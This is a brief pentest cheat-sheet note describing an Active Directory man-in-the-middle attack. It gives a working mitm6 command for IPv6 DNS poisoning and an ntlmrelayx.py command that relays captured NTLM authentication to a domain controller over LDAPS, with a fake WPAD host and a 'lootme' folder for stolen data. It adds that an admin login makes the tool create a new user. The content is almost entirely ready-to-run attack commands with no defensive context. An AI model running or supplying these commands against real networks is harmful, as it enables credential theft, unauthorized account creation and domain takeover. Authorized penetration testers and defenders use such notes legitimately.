# Man in the middle attack

*grab events on machines and pass them through ntlmrelayx to domain controller. Store loot in `lootme` folder* **If admin logs in then ntlmrelay will create new user and display that in logs**

```
ntlmrelayx.py -6 -t ldaps://[DOMAIN-CONTROLLER-IP] -wh fakewpad.[DOMAIN-NAME] -l lootme
```

```
sudo mitm6 -i eth0 -d [DOMAIN-NAME]
```
